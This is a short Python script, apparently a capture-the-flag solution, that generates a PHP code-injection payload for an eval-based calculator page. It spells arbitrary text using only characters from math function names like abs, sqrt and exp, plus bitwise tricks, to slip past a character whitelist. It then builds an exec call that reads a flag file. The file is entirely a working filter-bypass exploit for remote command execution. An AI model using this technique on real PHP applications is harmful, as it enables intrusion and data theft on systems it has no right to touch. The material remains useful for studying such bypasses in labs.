#!/usr/bin/env python

import requests
import sys
import pipes

#url='http://124.156.140.90:8081/calc.php?'

mapping = {
    64: "(((1/0).(1))[0])&(((1/0).(1))[2])",
    48: '(0).(0)[0]',
    32: "((0).(0)[0])&(((1.5).(0))[1])",
    16: "(8).(8)[0]&((1/0).(0))[0]|(8).(8)[0]&((1/0).(0))[0]",
    8: "(8).(8)[0]&((1/0).(0))[0]",
    4: "(4).(4)[0]&((1/0).(0))[2]",
    2: "(2).(2)[0]&((1/0).(0))[1]",
    1: "(1).(1)[0]&((0/0).(0))[1]"
}

idxs = [64, 48, 32, 16, 8, 4, 2, 1]

def construct_char(c):
    

    val = ord(c)
    if val>=97 and val <= 122 or val==95: 
        # print("letter")
        return constr_letter(c)
    elif val >=48 and val <=57:
        # number
        return "("+c+")"
    payload = "("
    for idx in idxs:
        if (val >= idx):
            val -= idx
            payload += mapping[idx]
            if (val != 0):
                payload +='|'

    assert val == 0
    payload += ")"

    return payload

def constr_letter(c):
    if(c=='a'): return "(abs[0])"
    if(c=='b'): return "(abs[1])"
    if(c=='c'): return "(acos[1])"
    if(c=='d'): return "(bindec[3])"
    if(c=='e'): return "(exp[0])"
    if(c=='f'): return "(fmod[0])"
    if(c=='g'): return "(log[2])"
    if(c=='h'): return "(hypot[0])"
    if(c=='i'): return "(pi[1])"
    if(c=='j'): return "(#no j)"
    if(c=='k'): return "(#no k)"
    if(c=='l'): return "(log[0])"
    if(c=='m'): return "(fmod[1])"
    if(c=='n'): return "(atan[3])" # - n
    if(c=='o'): return "(acos[2])" #- o
    if(c=='p'): return "(npr[1])" #- p
    if(c=='q'): return "(sqrt[1])" # - q
    if(c=='r'): return "(sqrt[2])" # - r
    if(c=='s'): return "(sqrt[0])" # - s
    if(c=='t'): return "(sqrt[3])" # - t
    if(c=='u'): return "(lcg_value[7])" # - u
    if(c=='v'): return "(lcg_value[4])" # - v
    if(c=='w'): return "(pow[2])" #- w
    if(c=='x'): return "(exp[1])" #- x
    if(c=='y'): return "(hypot[1])" # - y
    if(c=='_'): return "(is_finite[2])"

def construct_string(s):
    payload = "("
    for i, c in enumerate(s):
        payload += construct_char(c)
        if (i != len(s) - 1):
            payload += "."

    payload += ")"
    return payload

def call_fn(f, a):
    fn_s = "((exp[0]).(exp[1]).(exp[0]).(dechex[2]))"
    #fn_s = construct_string(f)
    fn_a = construct_string(a)
    return fn_s + "(" + fn_a + ")"

payload = call_fn("exec", """cat /flag_a2647e5eb8e9e767fe298aa012a49b50""")
print(payload)
print(len(payload))